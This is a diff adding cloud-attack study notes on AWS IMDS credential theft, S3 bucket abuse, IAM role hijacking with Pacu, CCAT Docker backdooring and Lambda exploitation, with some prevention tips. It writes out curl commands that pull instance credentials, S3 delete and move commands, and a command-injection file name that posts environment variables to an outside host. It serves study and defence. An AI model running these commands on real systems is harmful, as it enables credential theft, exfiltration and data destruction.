@@ -229,10 +229,215 @@ What Happens If Attackers Succeed?
  It can use protocols like:
    RPC/HTTP
    Messaging Application Programming Interface (MAPI)
+ 12]Gathering Cloud Keys Through IMDS Attack
+ What are Cloud Keys? :- Cloud keys in AWS are like username + password for accessing cloud services.
+ They include: Access Key ID, Secret Access Key
+ These keys are used to allow apps or users to connect to services like S3, EC2, etc.
+ What is IMDS? :- IMDS (Instance Metadata Service) lets AWS EC2 instances talk to AWS and get information like: Instance ID, IAM Role name, Temporary credentials (cloud keys)
+ IMDS runs on a special internal IP address: `169.254.169.254`
+ How do attackers exploit IMDS (IMDSv1)? :- If attackers somehow get inside an EC2 instance (e.g., via a web app or SSRF attack), they can send requests to IMDS and steal cloud credentials.
+ Steps:
+ 1)Run this to list roles attached to the EC2:
+   curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+ 2)Then, run this with the role name to get the cloud keys:
+   curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<IAM-Role-Name>
+ IMDSv2: A More Secure Version :- IMDSv2 uses a token-based approach to protect access.
+ Steps (if using IMDSv2):
+ 1)First, get a token:
+   TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
+ 2)Then use that token in future metadata requests:
+   curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
+ 13]Exploiting AWS with Nimbostratus
+ What is Nimbostratus? :- Nimbostratus is a tool that attackers use to:
+ Find out what an AWS user or role can do
+ Steal cloud credentials
+ Make new users
+ Access databases via snapshots
+ Key Features of Nimbostratus:
+|  Action             |  What it Does                                                              |
+| ------------------- | -------------------------------------------------------------------------- |
+| `dump-credentials`  | Shows all credentials stored in the system (from metadata, env vars, etc.) |
+| `dump-permissions`  | Lists all actions the stolen credentials can perform                       |
+| `dump-ec2-metadata` | Reveals instance metadata (info about EC2 and attached roles)              |
+| `snapshot-rds`      | Creates a database snapshot and restores it to access stored data          |
+| `create-iam-user`   | Makes a **new user account** using the stolen credentials                  |
+ How to Prevent These Attacks
+  Use IAM roles only — never give root access to users or apps
+  Give least privilege — only allow what is absolutely needed
+  Use instance profiles — this helps manage permissions cleanly
+  Group users — assign fine-grained policies to groups instead of individual users
+  Audit permissions regularly — check who has access to what and remove anything unnecessary
+ 14]Exploiting Misconfigured AWS S3 Buckets
+ Step 1: Find the S3 Buckets
+  Attackers use special tools to search for exposed S3 buckets.
+  Some of the popular tools are: S3Scanner, lazys3, Bucket Finder, s3-buckets-bruteforcer
+ These tools help find bucket URLs, such as:
+  http://[bucket_name].s3.amazonaws.com/
+ Step 2: Install AWS CLI
+  To interact with S3, attackers set up the AWS Command Line Interface (CLI): aws --version
+  They create a dummy account (sometimes even a real one) to use the CLI.
+ Step 3: Get Access Keys
+  From the AWS Management Console:
+  1)Go to [IAM Console](https://console.aws.amazon.com/iam/)
+  2)Click Users → Add User
+  3)Enter details and click Create User
+  4)Download the CSV file to get the Access Key ID and Secret Access Key
+ Step 4: Configure AWS CLI
+  Run this command in terminal: aws configure
+  You'll be asked to enter: Access Key ID, Secret Access Key, Default region, Output format (e.g., json)
+ Step 5: Check If Buckets Are Vulnerable
+ To check access (even without credentials), run:
+  aws s3 ls s3://[bucket_name] --no-sign-request
+  If files are listed, the bucket is publicly readable.
+  If access is denied, it may still be misconfigured in other ways.
+ Step 6: Exploit the S3 Bucket
+ Attackers can now manipulate the data inside the S3 bucket using these commands:
+| Action       | Command                                                                 |
+| -------------| ----------------------------------------------------------------------- |
+| Read Files   | `aws s3 ls s3://[bucket_name] --no-sign-request`                        |
+| Move Files   | `aws s3 mv FileName s3://[bucket_name]/test-file.txt --no-sign-request` |
+| Copy Files   | `aws s3 cp FileName s3://[bucket_name]/test-file.svg --no-sign-request` |
+| Delete Files | `aws s3 rm s3://[bucket_name]/test-file.svg --no-sign-request`          |
+ Best Practices to Prevent This
+|  Do This                          |  Avoid This                                     |
+| --------------------------------- | ----------------------------------------------- |
+| Enable bucket encryption          | Leaving buckets public unintentionally          |
+| Use proper IAM policies           | Using `*` (wildcard) permissions                |
+| Block public access unless needed | Uploading sensitive data without access control |
+| Monitor bucket access logs        | Ignoring security audits or warnings            |
+ 15]Compromising AWS IAM Credentials
+ AWS IAM (Identity and Access Management) is used to control who can access AWS services and resources. However, attackers can compromise IAM credentials by exploiting various weaknesses in how cloud environments are managed.
+ 1)Repository Misconfigurations
+ Developers sometimes store AWS keys in shared Git repositories for convenience.
+ If keys are accidentally made public (e.g., via GitHub), attackers can find and misuse them.
+ Even with AWS alerts, attackers may still exploit these leaks before action is taken.
+ Example: An environment variable file pushed to GitHub with a commit message like "updated .gitignore" can accidentally reveal AWS API keys.
+ 2)Social Engineering
+ Attackers trick users through fake emails, calls, or SMS.
+ They might create phishing pages to capture AWS API keys directly from users.
+ 3)Password Reuse
+ Users often reuse passwords across multiple platforms.
+ If an attacker gets one password from a data breach, they can try the same credentials on AWS.
+ Passwords may be stolen if another service’s database is compromised.
+ 4)Vulnerabilities in AWS-Hosted Applications
+ a]Server-Side Request Forgery (SSRF)
+ Attackers exploit web app flaws to send internal requests.
+ They target the EC2 metadata service to obtain temporary credentials via IAM instance profiles.
+ b]Reading Local Files
+ AWS credentials stored locally (e.g., in `.aws/credentials` or environment variable files) can be read if the attacker gains OS-level access.
+ 5)Exploiting Third-Party Software
+ Organizations use third-party tools to manage cloud services.
+ If these tools are compromised (e.g., a password manager), attackers can access AWS credentials and resources.
+ 6)Insider Threats
+ Insiders, like current or former employees, can misuse their access.
+ A disgruntled employee may leak data, make unauthorized changes, or sabotage the system without needing to steal credentials.
+ 16]Enumerating Azure AD Accounts & Exploiting Cloud IAM Roles
+ 1)Azure Active Directory (AD) Enumeration
+  Attackers target cloud-based services like Office 365, which are directly accessible from the Internet, to enumerate user and admin accounts in Azure AD.
+ Account Enumeration
+  Tool: [Azucar](https://github.com/nccgroup/azucar)
+  Purpose: Audits security posture of Azure environments.
+  Functionality: Multi-threaded, plug-in based, non-intrusive assessment.
+ 2)Password Spraying
+  Method: Attempts the same password across many accounts to avoid lockouts.
+  Risk: If on-prem and cloud accounts share credentials and lack MFA, attackers can gain access.
+  Tool: [Ruler](https://github.com/sensepost/ruler)
+  Use: Interacts with Exchange servers using protocols like RPC/HTTP.
+ 17]Hijacking AWS IAM Roles using Pacu
+ Misconfigured IAM policies (e.g., `“AWS”:“*”`) can allow unauthorized users to assume roles and extract credentials.
+ Tool: [Pacu](https://github.com/RhinoSecurityLabs/pacu)
+ Purpose: AWS exploitation framework.
+ Features:
+   Enumerates IAM roles using built-in wordlists.
+   Automatically assumes misconfigured roles.
+   Exposes role credentials in JSON format.
+ Command Example:
+  assume_role_enum.py [-h] [-p PROFILE] [-w WORD_LIST] -I ACCOUNT_ID
+ 18]Cracking AWS Access Keys with DumpsterDiver
+ Attackers search for hardcoded secrets and passwords within files on local systems or repositories.
+ Tool: [DumpsterDiver](https://github.com/securing/DumpsterDiver)
+ Purpose: Scans files for AWS keys, SSL certificates, Azure keys, etc.
+ Notable Flags:
+  `-p LOCAL_PATH`: Directory to scan.
+  `-s`: Search for hardcoded passwords.
+  `-a`: Use advanced custom rules (`rules.yaml`).
+  `-o OUTFILE`: Output results in JSON.
+ Command Example:
+  DumpsterDiver.py -p /target/folder -s -a -o output.json
+ 19]Exploiting Docker Containers on AWS using CCAT
+ Cloud Container Attack Tool (CCAT) is used by attackers to exploit Docker containers hosted on AWS — particularly through ECS (Elastic Container Service) and ECR (Elastic Container Registry).
+ Overview :- Attackers start with stolen or misused AWS credentials and use CCAT to:
+ 1)Find Docker images in ECR
+ 2)Pull and modify those images (add backdoors)
+ 3)Push them back to AWS to hijack future container runs
+ Step-by-Step Attack Process
+ Step 1: Abuse AWS Credentials
+  What attackers do: Use stolen credentials to explore AWS services.
+  Tool Module Used: `Enumerate ECR`
+  Goal: List available ECR repositories (locations where Docker images are stored).
+ Step 2: Pull Target Docker Image
+  What attackers do: Identify a Docker image from the list and pull it.
+  Tool Module Used: `Pull Repos from ECR`
+  Goal: Download the Docker image of the target organization for tampering.
+ Step 3: Create a Backdoor Image
+  What attackers do: Inject a reverse shell or other backdoor into the Docker image.
+  This is done by replacing the default `CMD` in the Dockerfile to initiate a reverse shell.
+  Tool Module Used: `Docker Backdoor`
+ Step 4: Push the Backdoored Image Back
+  What attackers do: Push the modified (backdoored) Docker image back to the ECR repository.
+  Tool Module Used: `Push Repos to ECR`
+  Goal: Replace the original image so that when it’s used, the backdoor gets triggered.
+ Attack Impact
+  When AWS services (like ECS) launch a container using the infected image, the attacker gets remote access to the container.
+  This can lead to: Data theft, Lateral movement within the AWS environment, Full infrastructure compromise
+ 20]Serverless-Based Attacks on AWS Lambda
+ AWS Lambda functions, while eliminating the need to manage servers, introduce new security risks. These serverless functions are vulnerable to application-level attacks such as: DDoS (Distributed Denial of Service), Command Injection, Cross-Site Scripting (XSS)
+ Attackers can abuse Lambda functions to gain unauthorized access and elevate privileges within a cloud environment. Two main attack models are used:
+ 1)Black-Box Scenario :- Attacker has no prior knowledge of the environment and works by making assumptions and exploiting misconfigurations.
+ Steps:
+ 1}Access Misconfigured S3 Bucket
+ No credential restrictions allow access to organizational files.
+ 2}Upload Malicious Files to S3
+ Attacker rechecks permissions after upload.
+ 3}Invoke Lambda for Tag Calculation
+ Lambda functions triggered to calculate file tags may leak metadata.
+ 4}Exfiltrate Cloud Credentials
+ Use environment variables or misconfigured code to steal credentials and escalate privileges.
+ AWS CLI Commands Used:
+ List S3 bucket contents:
+  aws s3 ls prod-file-bucket-eu
+ Get file tags:
+  aws s3api get-object-tagging --bucket prod-file-bucket-eu --key config161.zip
+ Inject commands (command injection):
+  aws s3 cp config.zip 's3://prod-file-bucket-eu/screen;curl -X POST -d "testCurl" <Target IP>:443;'
+ Extract AWS credentials via environment dump:
+  aws s3 cp config.zip 's3://prod-file-bucket-eu/screen;curl -X POST -d "`env`" <Target IP>:443;.zip'
+ 2)White-Box Scenario :- Attacker has internal knowledge, such as credentials and account configuration details.
+ Steps:
+ 1}Phishing or Social Engineering
+   Attacker acquires valid user credentials.
+ 2}Enumerate IAM Roles and Policies
+   Identifies S3 buckets or other misconfigured resources.
+ 3}List Lambda Functions
+   Gathers metadata about Lambda functions.
+ 4}Download Lambda Code
+   Looks for vulnerable code or hardcoded secrets.
+ 5}Exploit Lambda Function
+   Use the exploited Lambda to perform lateral movement or data exfiltration.
+ AWS CLI Commands Used:
+ List user policies:
+  aws iam list-attached-user-policies --user-name operator
+ List Lambda functions:
+  aws lambda list-functions
+ Download Lambda code:
+  aws lambda get-function --function-name corpFuncEasy
 
 
 
-page 2018
+
+
+
+
 
 
 
